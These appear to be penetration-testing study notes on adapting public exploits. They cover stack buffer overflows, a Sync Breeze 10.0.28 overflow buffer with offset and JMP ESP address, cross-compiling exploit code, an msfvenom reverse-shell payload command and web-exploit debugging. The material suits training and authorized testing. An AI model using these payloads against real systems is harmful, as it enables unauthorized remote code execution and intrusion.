# Fixing Exploits

Fixing public exploits means modifying them to suit our needs. Common challenges include buffer overflows, requiring modifications to target parameters like socket information, return addresses, payloads, and offsets.

Before running the pentest, define the scope and inform the client that production downtime may occur.

Always read the exploit code carefully, modify as needed, and test it against your own sandboxed target.

---

## Fixing Memory Corruption Exploits

- **Buffer**: Memory area for holding user-sent content for processing.
- **Buffer Overflow**: When input exceeds stack limits and overwrites adjacent memory.
- Can occur in **heap** (dynamically managed, large global data) or **stack** (local data, fixed size).
- Example:
  ```c
  char buffer[64];
  strcpy(buffer, argv[1]);  // No boundary check
  ```
- **Return Address**: Stored memory address for next function after current completes.
- **Overflowing Return Address**: Alters EIP/RIP, allowing shellcode execution if return address is overwritten.

### Flow of Stack-Based Buffer Overflow:
1. Create a large buffer to trigger overflow.
2. Overwrite return address with JMP ESP (or equivalent).
3. Include NOP sled + shellcode.
4. Handle bad characters (e.g., ASCII/Unicode control chars).

---

## Importing and Examining the Exploit

- Target: `Sync Breeze Enterprise 10.0.28`, exploit `42341.c`.
- Vulnerability in HTTP server module with POST request.

```python
offset = "A" * 780
JMP_ESP = "\x83\x0c\x09\x10"
shellcode = "\x90" * 16 + msf_shellcode
exploit = offset + JMP_ESP + shellcode
```

- `0x10090c83` is the JMP ESP address. 16 NOPs prepended to shellcode.

---

## Python vs C

- **Python**: Interpreter-based, can't run standalone if Python not installed. Easy string concatenation.
- **C**: Compiled. Use `searchsploit -m <exploitdb-id>` and examine headers (e.g., `winsock2.h` = Windows).

---

## Cross-Compiling Exploit Code

Use `mingw-w64`:

```bash
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
```

To run with Wine:

```bash
wine exploit.exe
```

---

## Fixing the Exploit

- `msvbvm60.dll` missing → wrong return address.
- Use **Immunity Debugger**:
  - Attach process.
  - View > Executable Modules → Check DLL presence.
- If Python version is EDB verified, use its return address.
- Or recreate environment, search public exploits, or extract DLL and use `objdump`.

---

## Payload Generation

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<your-ip> LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
```

### Immunity Debugger:
- `Ctrl+G` to follow address.
- `F2` to set breakpoint.

---

## Changing the Overflow Buffer

```c
int initial_buffer_size = 780;
char *padding = malloc(initial_buffer_size);
memset(padding, 0x41, initial_buffer_size);           // Fill with 'A'
memset(padding + initial_buffer_size - 1, 0x00, 1);    // Null terminator
```

---

## Fixing Web Exploits

Key questions:
- HTTP or HTTPS?
- Specific path access?
- Needs pre-auth?
- GET or POST crafted how?
- Depends on default app settings?
- Affected by self-signed certs?

Use:

```python
requests.get(url, verify=False)
```

### Handling Errors

- Example: `IndexError: list index out of range` → Check `.split()` usage.
- Use `print()` for debugging.

---

## Alternative Tools

- **DirBuster** as alternative to **GoBuster**.
- Wordlists: `/usr/share/wordlists/dirbuster/` (more comprehensive).
